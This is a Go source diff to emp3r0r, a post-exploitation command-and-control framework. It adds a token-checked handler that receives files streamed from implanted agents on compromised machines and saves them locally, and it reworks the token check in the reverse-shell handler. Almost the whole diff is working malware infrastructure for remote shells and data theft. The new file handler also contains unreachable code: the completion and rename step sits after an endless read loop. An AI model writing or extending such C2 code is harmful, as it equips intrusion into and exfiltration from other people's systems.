@@ -10,12 +10,14 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/fatih/color"
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
@@ -23,8 +25,9 @@ import (
 type StreamHandler struct {
 	H2x     *agent.H2Conn // h2conn with context
 	Buf     chan []byte   // buffer for receiving data
-	Text    string        // temp string
+	Token   string        // token string, for agent auth
 	BufSize int           // buffer size for reverse shell should be 1
+	Mutex   *sync.Mutex   // prevent concurrent write to map
 }
 
 var (
@@ -34,9 +37,130 @@ var (
 	// ProxyStream proxy handler
 	ProxyStream = &StreamHandler{H2x: nil, BufSize: agent.ProxyBufSize, Buf: make(chan []byte)}
 
+	// FTPStreams file transfer handlers
+	FTPStreams = make(map[string]*StreamHandler)
+
 	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
 	PortFwds = make(map[string]*PortFwdSession)
 )
+
+// ftpHandler handles buffered data
+func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) {
+	// check if an agent is already connected
+	if sh.H2x.Ctx != nil ||
+		sh.H2x.Cancel != nil ||
+		sh.H2x.Conn != nil {
+		CliPrintError("ftpHandler: occupied")
+		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+		return
+	}
+
+	var err error
+	// use h2conn
+	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
+	if err != nil {
+		CliPrintError("ftpHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
+		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+		return
+	}
+
+	// agent auth
+	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
+	buf := make([]byte, sh.BufSize)
+	_, err = sh.H2x.Conn.Read(buf)
+	buf = bytes.Trim(buf, "\x00")
+	agentToken, err := uuid.ParseBytes(buf)
+	if err != nil {
+		CliPrintError("Invalid ftp token %s: %v", buf, err)
+		return
+	}
+	if agentToken.String() != sh.Token {
+		CliPrintError("Invalid ftp token '%s vs %s'", agentToken.String(), sh.Token)
+		return
+	}
+	CliPrintSuccess("Got a ftp connection (%s) from %s", sh.Token, req.RemoteAddr)
+
+	// save the file
+	filename := ""
+	for fname, persh := range FTPStreams {
+		if sh.Token == persh.Token {
+			filename = fname
+			break
+		}
+	}
+	defer func() {
+		// cleanup
+		if sh.H2x.Conn != nil {
+			err = sh.H2x.Conn.Close()
+			if err != nil {
+				CliPrintError("ftpHandler failed to close connection: " + err.Error())
+			}
+		}
+		sh.Token = ""
+		sh.H2x.Cancel()
+		sh.Mutex.Lock()
+		delete(FTPStreams, filename)
+		sh.Mutex.Unlock()
+		CliPrintWarning("Closed ftp connection from %s", req.RemoteAddr)
+	}()
+
+	// abort if we dont have the filename
+	if filename == "" {
+		CliPrintError("%s failed to parse filename", sh.Token)
+		return
+	}
+	targetFile := FileGetDir + util.FileBaseName(filename)
+	filewrite := filename + ".downloading"
+	targetSize := util.FileSize(filename)
+	// FileGetDir
+	if !util.IsFileExist(FileGetDir) {
+		err = os.MkdirAll(FileGetDir, 0700)
+		if err != nil {
+			CliPrintError("mkdir -p %s: %v", FileGetDir, err)
+			return
+		}
+	}
+	go func() {
+		f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+		if err != nil {
+			CliPrintError("processAgentData write file: %v", err)
+		}
+		defer f.Close()
+
+		// write the file
+		for filedata := range sh.Buf {
+			_, err = f.Write(filedata)
+			if err != nil {
+				CliPrintError("processAgentData failed to save file: %v", err)
+				return
+			}
+		}
+	}()
+
+	// read filedata
+	for {
+		data := make([]byte, sh.BufSize)
+		_, err = sh.H2x.Conn.Read(data)
+		if err != nil {
+			CliPrintWarning("Disconnected: ftpHandler read: %v", err)
+			return
+		}
+		sh.Buf <- data
+	}
+
+	// have we finished downloading?
+	nowSize := util.FileSize(filewrite)
+	if nowSize == targetSize {
+		err = os.Rename(filewrite, targetFile)
+		if err != nil {
+			CliPrintError("Failed to save downloaded file %s: %v", targetFile, err)
+		}
+		checksum := tun.SHA256SumFile(targetFile)
+		CliPrintSuccess("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
+		return
+	}
+	CliPrintWarning("Incomplete download (%d of %d bytes), will continue if you run GET again", nowSize, targetSize)
+}
 
 // portFwdHandler handles proxy/port forwarding
 func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
@@ -172,11 +296,11 @@ func (sh *StreamHandler) rshellHandler(wrt http.ResponseWriter, req *http.Reques
 		CliPrintError("Invalid rshell token %s: %v", buf, err)
 		return
 	}
-	if agentToken.String() != sh.Text {
-		CliPrintError("Invalid rshell token '%s vs %s'", agentToken.String(), sh.Text)
+	if agentToken.String() != sh.Token {
+		CliPrintError("Invalid rshell token '%s vs %s'", agentToken.String(), sh.Token)
 		return
 	}
-	CliPrintSuccess("Got a reverse shell connection (%s) from %s", sh.Text, req.RemoteAddr)
+	CliPrintSuccess("Got a reverse shell connection (%s) from %s", sh.Token, req.RemoteAddr)
 
 	defer func() {
 		if sh.H2x.Conn != nil {
@@ -185,7 +309,7 @@ func (sh *StreamHandler) rshellHandler(wrt http.ResponseWriter, req *http.Reques
 				CliPrintError("rshellHandler failed to close connection: " + err.Error())
 			}
 		}
-		sh.Text = ""
+		sh.Token = ""
 		sh.H2x.Cancel()
 		CliPrintWarning("Closed reverse shell connection from %s", req.RemoteAddr)
 	}()
